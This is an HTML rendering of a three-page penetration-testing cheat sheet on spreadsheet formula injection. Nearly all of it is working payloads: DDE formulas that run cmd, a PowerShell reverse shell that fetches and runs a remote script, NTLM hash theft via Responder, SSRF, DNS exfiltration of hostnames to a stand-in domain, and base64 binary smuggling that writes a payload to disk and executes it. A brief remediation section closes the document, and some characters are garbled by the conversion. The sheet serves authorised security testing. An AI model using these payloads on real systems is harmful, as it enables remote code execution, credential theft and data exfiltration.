<html>
<head><meta http-equiv=Content-Type content="text/html; charset=UTF-8">
<style type="text/css">
<!--
span.cls_003{font-family:Arial,serif;font-size:6.0px;color:rgb(67,73,81);font-weight:normal;font-style:normal;text-decoration: none}
div.cls_003{font-family:Arial,serif;font-size:6.0px;color:rgb(67,73,81);font-weight:normal;font-style:normal;text-decoration: none}
span.cls_006{font-family:Arial,serif;font-size:18.1px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
div.cls_006{font-family:Arial,serif;font-size:18.1px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
span.cls_005{font-family:Arial,serif;font-size:11.1px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
div.cls_005{font-family:Arial,serif;font-size:11.1px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
span.cls_016{font-family:Arial,serif;font-size:11.1px;color:rgb(0,0,255);font-weight:normal;font-style:normal;text-decoration: underline}
div.cls_016{font-family:Arial,serif;font-size:11.1px;color:rgb(0,0,255);font-weight:normal;font-style:normal;text-decoration: none}
span.cls_008{font-family:Arial,serif;font-size:11.1px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
div.cls_008{font-family:Arial,serif;font-size:11.1px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
span.cls_009{font-family:Arial,serif;font-size:8.1px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
div.cls_009{font-family:Arial,serif;font-size:8.1px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
span.cls_017{font-family:Arial,serif;font-size:11.1px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: underline}
div.cls_017{font-family:Arial,serif;font-size:11.1px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
span.cls_010{font-family:Arial,serif;font-size:9.1px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
div.cls_010{font-family:Arial,serif;font-size:9.1px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
span.cls_011{font-family:Arial,serif;font-size:9.1px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
div.cls_011{font-family:Arial,serif;font-size:9.1px;color:rgb(0,0,0);font-weight:bold;font-style:normal;text-decoration: none}
span.cls_012{font-family:Arial,serif;font-size:11.1px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
div.cls_012{font-family:Arial,serif;font-size:11.1px;color:rgb(0,0,0);font-weight:normal;font-style:normal;text-decoration: none}
span.cls_018{font-family:Arial,serif;font-size:11.1px;color:rgb(0,0,255);font-weight:bold;font-style:normal;text-decoration: underline}
div.cls_018{font-family:Arial,serif;font-size:11.1px;color:rgb(0,0,255);font-weight:bold;font-style:normal;text-decoration: none}
-->
</style>
<script type="text/javascript" src="bf298f90-0d40-11e9-8f58-0cc47a792c0a_id_bf298f90-0d40-11e9-8f58-0cc47a792c0a_files/wz_jsgraphics.js"></script>
</head>
<body>
<div style="position:absolute;left:50%;margin-left:-306px;top:0px;width:612px;height:792px;border-style:outset;overflow:hidden">
<div style="position:absolute;left:0px;top:0px">
<img src="bf298f90-0d40-11e9-8f58-0cc47a792c0a_id_bf298f90-0d40-11e9-8f58-0cc47a792c0a_files/background1.jpg" width=612 height=792></div>
<div style="position:absolute;left:346.63px;top:37.32px" class="cls_003"><span class="cls_003">8240 S. Kyrene Road</span></div>
<div style="position:absolute;left:445.66px;top:37.32px" class="cls_003"><span class="cls_003">P 480 621 8967</span></div>
<div style="position:absolute;left:346.63px;top:46.44px" class="cls_003"><span class="cls_003">Suite A-113</span></div>
<div style="position:absolute;left:445.66px;top:46.44px" class="cls_003"><span class="cls_003">F 480 383 6401</span></div>
<div style="position:absolute;left:346.63px;top:55.68px" class="cls_003"><span class="cls_003">Tempe, AZ 85284</span></div>
<div style="position:absolute;left:445.66px;top:55.68px" class="cls_003"><span class="cls_003"> </span><A HREF="http://www.bishopfox.com/">www.bishopfox.com</A> </div>
<div style="position:absolute;left:72.02px;top:107.30px" class="cls_006"><span class="cls_006">FORMULA INJECTION CHEAT SHEET</span></div>
<div style="position:absolute;left:72.02px;top:147.26px" class="cls_005"><span class="cls_005">This cheat sheet accompanies the blog post </span><A HREF="https://www.bishopfox.com/blog/2018/06/server-side-spreadsheet-injections/">"Server-Side Spreadsheet Injection - Formula</A> </span></div>
<div style="position:absolute;left:72.02px;top:162.14px" class="cls_016"><span class="cls_016"> </span><A HREF="https://www.bishopfox.com/blog/2018/06/server-side-spreadsheet-injections/">Injection to Remote Code Execution"</A><span class="cls_005"> and presentation “</span><span class="cls_016">Server-side Spreadsheet Injections</span></div>
<div style="position:absolute;left:72.02px;top:177.14px" class="cls_016"><span class="cls_016">in High Impact Attacks</span><span class="cls_005">”, which describes several server-side vectors in addition to the</span></div>
<div style="position:absolute;left:72.02px;top:192.14px" class="cls_005"><span class="cls_005">traditional client-side attacks attributed to CSV injection.</span></div>
<div style="position:absolute;left:72.02px;top:224.06px" class="cls_005"><span class="cls_005">When assessing export or upload functionality that handles XLS*/CSV documents, use the</span></div>
<div style="position:absolute;left:72.02px;top:239.09px" class="cls_005"><span class="cls_005">following cheat sheet to inject formulas to disclose information, exfiltrate data/credentials,</span></div>
<div style="position:absolute;left:72.02px;top:254.09px" class="cls_005"><span class="cls_005">or obtain remote code execution:</span></div>
<div style="position:absolute;left:72.02px;top:286.01px" class="cls_008"><span class="cls_008">Formula initiating characters</span></div>
<div style="position:absolute;left:77.66px;top:302.57px" class="cls_005"><span class="cls_005">=</span></div>
<div style="position:absolute;left:314.11px;top:301.61px" class="cls_005"><span class="cls_005">=SUM(1,1)</span></div>
<div style="position:absolute;left:77.66px;top:319.01px" class="cls_005"><span class="cls_005">-</span></div>
<div style="position:absolute;left:314.11px;top:318.05px" class="cls_005"><span class="cls_005">-SUM(1,1)</span></div>
<div style="position:absolute;left:77.66px;top:335.45px" class="cls_005"><span class="cls_005">+</span></div>
<div style="position:absolute;left:314.11px;top:334.61px" class="cls_005"><span class="cls_005">+SUM(1,1)</span></div>
<div style="position:absolute;left:77.66px;top:352.01px" class="cls_005"><span class="cls_005">@</span></div>
<div style="position:absolute;left:314.11px;top:351.05px" class="cls_005"><span class="cls_005">@SUM(1,1)</span></div>
<div style="position:absolute;left:72.02px;top:384.41px" class="cls_008"><span class="cls_008">Useful Formulas for Injection</span></div>
<div style="position:absolute;left:77.66px;top:400.03px" class="cls_005"><span class="cls_005">NOW()</span></div>
<div style="position:absolute;left:290.57px;top:400.87px" class="cls_005"><span class="cls_005">Can be used to determine if real-time server-</span></div>
<div style="position:absolute;left:290.57px;top:415.87px" class="cls_005"><span class="cls_005">side formula evaluation is being performed.</span></div>
<div style="position:absolute;left:77.66px;top:431.47px" class="cls_005"><span class="cls_005">WEBSERVICE(“&lt;URLʝ”)</span></div>
<div style="position:absolute;left:290.57px;top:432.43px" class="cls_005"><span class="cls_005">Can be used to perform GET-based SSRF, TCP</span></div>
<div style="position:absolute;left:290.57px;top:447.43px" class="cls_005"><span class="cls_005">egress testing, or DNS egress testing, e.g.,</span></div>
<div style="position:absolute;left:290.57px;top:461.47px" class="cls_005"><span class="cls_005">=WEBSERVICE(“httpǥ//mysite.comǥ22”)</span></div>
<div style="position:absolute;left:77.66px;top:477.67px" class="cls_005"><span class="cls_005">CELL(“&lt;paramʝ”)/INFO(“&lt;paramʝ”)</span></div>
<div style="position:absolute;left:290.57px;top:477.67px" class="cls_005"><span class="cls_005">Gather information (current working directory,</span></div>
<div style="position:absolute;left:290.57px;top:492.67px" class="cls_005"><span class="cls_005">file path, file name, Excel version) about the</span></div>
<div style="position:absolute;left:290.57px;top:507.67px" class="cls_005"><span class="cls_005">Excel execution environment.</span></div>
<div style="position:absolute;left:77.66px;top:524.11px" class="cls_005"><span class="cls_005">(DDE commands) =&lt;Program-in-</span></div>
<div style="position:absolute;left:290.57px;top:524.11px" class="cls_005"><span class="cls_005">Execute arbitrary commands in the path using</span></div>
<div style="position:absolute;left:77.66px;top:538.15px" class="cls_005"><span class="cls_005">pathʝȈ’&lt;paramsʝ’![A-z][A-z0-</span></div>
<div style="position:absolute;left:290.57px;top:539.11px" class="cls_005"><span class="cls_005">DDE. =MSPAINTȈ’&lt;paramsʝ’!A0, =CMDȈ’/c</span></div>
<div style="position:absolute;left:77.66px;top:551.95px" class="cls_005"><span class="cls_005">9]*</span></div>
<div style="position:absolute;left:290.57px;top:553.15px" class="cls_005"><span class="cls_005">nslookup mysite.com’!A1</span></div>
<div style="position:absolute;left:72.02px;top:585.46px" class="cls_008"><span class="cls_008">Reverse Shell Payloads</span></div>
<div style="position:absolute;left:77.66px;top:601.90px" class="cls_005"><span class="cls_005">Reverse shell via</span></div>
<div style="position:absolute;left:198.89px;top:601.90px" class="cls_005"><span class="cls_005">(use Metasploit’s exploit/multi/script/web_delivery) e.g.,</span></div>
<div style="position:absolute;left:77.66px;top:616.90px" class="cls_005"><span class="cls_005">HTTP</span></div>
<div style="position:absolute;left:198.89px;top:617.02px" class="cls_005"><span class="cls_005">=cmd|'/c powershell.exe -w hidden $e=(New-Object</span></div>
<div style="position:absolute;left:198.89px;top:630.82px" class="cls_005"><span class="cls_005">System.Net.WebClient).DownloadString("</span><A HREF="http://bisho/">http://bisho</A> </div>
<div style="position:absolute;left:198.89px;top:644.62px" class="cls_005"><span class="cls_005">pfox.com/shell.ps1");</span></div>
<div style="position:absolute;left:198.89px;top:659.50px" class="cls_005"><span class="cls_005">powershell -e $e'!A1</span></div>
<div style="position:absolute;left:77.66px;top:675.70px" class="cls_005"><span class="cls_005">Reverse shell via DNS</span></div>
<div style="position:absolute;left:198.89px;top:675.70px" class="cls_005"><span class="cls_005">(use binary smuggling to upload and execute the SensePost DNS</span></div>
<div style="position:absolute;left:198.89px;top:690.70px" class="cls_005"><span class="cls_005">Shell)</span></div>
<div style="position:absolute;left:72.02px;top:745.68px" class="cls_009"><span class="cls_009">Bishop Fox™ Confidential</span></div>
<div style="position:absolute;left:535.54px;top:745.68px" class="cls_009"><span class="cls_009">1</span></div>
</div>
<div style="position:absolute;left:50%;margin-left:-306px;top:802px;width:612px;height:792px;border-style:outset;overflow:hidden">
<div style="position:absolute;left:0px;top:0px">
<img src="bf298f90-0d40-11e9-8f58-0cc47a792c0a_id_bf298f90-0d40-11e9-8f58-0cc47a792c0a_files/background2.jpg" width=612 height=792></div>
<div style="position:absolute;left:72.02px;top:88.70px" class="cls_008"><span class="cls_008">External Spreadsheet Reference</span></div>
<div style="position:absolute;left:77.66px;top:105.14px" class="cls_005"><span class="cls_005">Reference Cell in</span></div>
<div style="position:absolute;left:204.41px;top:104.30px" class="cls_005"><span class="cls_005">=‘Cǥ\Users\&lt;user>\Desktop\[test.xlsxȄ’!Sheet1!$A$1</span></div>
<div style="position:absolute;left:77.66px;top:120.14px" class="cls_005"><span class="cls_005">another sheet</span></div>
<div style="position:absolute;left:77.66px;top:136.58px" class="cls_005"><span class="cls_005">NTLM Hash Theft via</span></div>
<div style="position:absolute;left:204.41px;top:135.74px" class="cls_005"><span class="cls_005">=‘httpǥ//listening_responder_instance’!A0</span></div>
<div style="position:absolute;left:77.66px;top:151.58px" class="cls_005"><span class="cls_005">Responder</span></div>
<div style="position:absolute;left:77.66px;top:168.02px" class="cls_005"><span class="cls_005">Download files to</span></div>
<div style="position:absolute;left:204.41px;top:167.18px" class="cls_005"><span class="cls_005">=‘httpǥ//mysite.com/giant/file’!A0</span></div>
<div style="position:absolute;left:77.66px;top:183.02px" class="cls_005"><span class="cls_005">InetCache</span></div>
<div style="position:absolute;left:77.66px;top:199.58px" class="cls_005"><span class="cls_005">SSRF</span></div>
<div style="position:absolute;left:204.41px;top:198.62px" class="cls_005"><span class="cls_005">=’httpǥ//&lt;internal_assetʝǥ&lt;portʝ’!A0</span></div>
<div style="position:absolute;left:72.02px;top:231.98px" class="cls_008"><span class="cls_008">Excel 4.0 Macros</span></div>
<div style="position:absolute;left:77.66px;top:248.45px" class="cls_005"><span class="cls_005">Named ranges</span></div>
<div style="position:absolute;left:284.45px;top:248.45px" class="cls_005"><span class="cls_005">Use the name manager to create new names,</span></div>
<div style="position:absolute;left:284.45px;top:263.45px" class="cls_005"><span class="cls_005">use Excel 4.0 macros in place of name values.</span></div>
<div style="position:absolute;left:284.45px;top:278.45px" class="cls_005"><span class="cls_005">E.g., =FILES(). There are many good tutorials</span></div>
<div style="position:absolute;left:284.45px;top:293.45px" class="cls_005"><span class="cls_005">on using named ranges to list files in a directory.</span></div>
<div style="position:absolute;left:72.02px;top:325.85px" class="cls_008"><span class="cls_008">Filter/Egress Evasion</span></div>
<div style="position:absolute;left:77.66px;top:342.41px" class="cls_005"><span class="cls_005">Nested Formulas</span></div>
<div style="position:absolute;left:284.45px;top:341.45px" class="cls_005"><span class="cls_005">=SUM(NOW()+CMDȈ’/c nslookup</span></div>
<div style="position:absolute;left:284.45px;top:355.25px" class="cls_005"><span class="cls_005">17.bishopfox.com’!A1, 1)</span></div>
<div style="position:absolute;left:77.66px;top:371.57px" class="cls_005"><span class="cls_005">Whitespace or missing operands</span></div>
<div style="position:absolute;left:284.45px;top:370.61px" class="cls_005"><span class="cls_005">=SUM(1,</span></div>
<div style="position:absolute;left:383.45px;top:370.61px" class="cls_005"><span class="cls_005">+-+-+-</span></div>
<div style="position:absolute;left:469.30px;top:370.61px" class="cls_005"><span class="cls_005">SUM(</span></div>
<div style="position:absolute;left:284.45px;top:384.41px" class="cls_005"><span class="cls_005">2,2))</span></div>
<div style="position:absolute;left:77.66px;top:400.75px" class="cls_005"><span class="cls_005">External Spreadsheet Reference</span></div>
<div style="position:absolute;left:284.45px;top:400.75px" class="cls_005"><span class="cls_005">(see External Spreadsheet Reference)</span></div>
<div style="position:absolute;left:77.66px;top:417.19px" class="cls_005"><span class="cls_005">Hostname Exfiltration via DNS (Unix)</span></div>
<div style="position:absolute;left:284.45px;top:416.35px" class="cls_005"><span class="cls_005">=CMDȈ’/c nslookup</span></div>
<div style="position:absolute;left:284.45px;top:430.15px" class="cls_005"><span class="cls_005">`hostname`.mysite.com’!A0</span></div>
<div style="position:absolute;left:77.66px;top:446.35px" class="cls_005"><span class="cls_005">Hostname Exfiltration via DNS</span></div>
<div style="position:absolute;left:284.45px;top:445.51px" class="cls_005"><span class="cls_005">=CMDȈ’/c for /f "delims=" %a in</span></div>
<div style="position:absolute;left:77.66px;top:461.35px" class="cls_005"><span class="cls_005">(Windows)</span></div>
<div style="position:absolute;left:284.45px;top:459.31px" class="cls_005"><span class="cls_005">('hostname') do nslookup</span></div>
<div style="position:absolute;left:284.45px;top:473.11px" class="cls_005"><span class="cls_005">%a.mysite.com ’Ȉ!A0</span></div>
<div style="position:absolute;left:72.02px;top:505.27px" class="cls_017"><span class="cls_017">Binary smuggling</span><span class="cls_005"> - This technique relies on the property that calculation chains evaluate</span></div>
<div style="position:absolute;left:72.02px;top:520.27px" class="cls_005"><span class="cls_005">from left to right. This serves as a work around for the 255-character string literal allowed</span></div>
<div style="position:absolute;left:72.02px;top:535.27px" class="cls_005"><span class="cls_005">in the parameter field (DDE Topic) of DDE commands. By Base64 encoding and distributing</span></div>
<div style="position:absolute;left:72.02px;top:550.27px" class="cls_005"><span class="cls_005">the binary payload across multiple DDE write commands, the payload can be written to</span></div>
<div style="position:absolute;left:72.02px;top:565.30px" class="cls_005"><span class="cls_005">disk, decoded and then executed at runtime, as shown below:</span></div>
<div style="position:absolute;left:72.02px;top:596.50px" class="cls_010"><span class="cls_010">=cmd|'/C echo|set</span></div>
<div style="position:absolute;left:72.02px;top:607.78px" class="cls_010"><span class="cls_010">/p="CgAkAHUAcgBsACAAPQAgACIAMQA4AC4AYgBmAC4AbQBiAGEAIgA7AAoAZgB1AG4AYwB0AGkAbwBuACAAZQ</span></div>
<div style="position:absolute;left:72.02px;top:619.06px" class="cls_010"><span class="cls_010">B4AGUAYwBEAE4AUwAo" > C:\ProgramData\activePDF\Temp\a.enc'!A0</span></div>
<div style="position:absolute;left:72.02px;top:631.42px" class="cls_010"><span class="cls_010">+cmd|'/C echo|set</span></div>
<div style="position:absolute;left:72.02px;top:642.70px" class="cls_010"><span class="cls_010">/p="ACQAYwBtAGQAKQAgAHsACgAkAGMAIAA9ACAAaQBlAHgAIAAkAGMAbQBkACAAMgA+ACYAMQAgAHwAIABPAH</span></div>
<div style="position:absolute;left:72.02px;top:653.98px" class="cls_010"><span class="cls_010">UAdAAtAFMAdAByAGkA" >> C:\ProgramData\activePDF\Temp\a.enc'!A0</span></div>
<div style="position:absolute;left:72.02px;top:666.34px" class="cls_011"><span class="cls_011">+...omitted for brevity…</span></div>
<div style="position:absolute;left:72.02px;top:678.70px" class="cls_010"><span class="cls_010">+cmd|'/C powershell -c "$a=Get-Content C:\ProgramData\activePDF\Temp\a.enc;powershell</span></div>
<div style="position:absolute;left:72.02px;top:689.98px" class="cls_010"><span class="cls_010">-e $a"'!A0</span></div>
<div style="position:absolute;left:72.02px;top:745.68px" class="cls_009"><span class="cls_009">Bishop Fox™ Confidential</span></div>
<div style="position:absolute;left:535.54px;top:745.68px" class="cls_009"><span class="cls_009">2</span></div>
</div>
<div style="position:absolute;left:50%;margin-left:-306px;top:1604px;width:612px;height:792px;border-style:outset;overflow:hidden">
<div style="position:absolute;left:0px;top:0px">
<img src="bf298f90-0d40-11e9-8f58-0cc47a792c0a_id_bf298f90-0d40-11e9-8f58-0cc47a792c0a_files/background3.jpg" width=612 height=792></div>
<div style="position:absolute;left:72.02px;top:104.66px" class="cls_008"><span class="cls_008">How to Remediate:</span></div>
<div style="position:absolute;left:90.02px;top:121.70px" class="cls_012"><span class="cls_012">•</span><span class="cls_005">   Escape all formulas with a single quote character [‘]</span></div>
<div style="position:absolute;left:90.02px;top:225.38px" class="cls_012"><span class="cls_012">•</span><span class="cls_005">   Use the Trust Center to disable </span><span class="cls_008">Data Connections</span><span class="cls_005"> and </span><span class="cls_008">Workbook Links</span><span class="cls_005"> to protect</span></div>
<div style="position:absolute;left:108.02px;top:243.41px" class="cls_005"><span class="cls_005">against untrusted documents:</span></div>
<div style="position:absolute;left:159.14px;top:488.83px" class="cls_008"><span class="cls_008">For more information, email </span><span class="cls_018">contact@bishopfox.com</span><span class="cls_008">.</span></div>
<div style="position:absolute;left:72.02px;top:745.68px" class="cls_009"><span class="cls_009">Bishop Fox™ Confidential</span></div>
<div style="position:absolute;left:535.54px;top:745.68px" class="cls_009"><span class="cls_009">3</span></div>
</div>

</body>
</html>
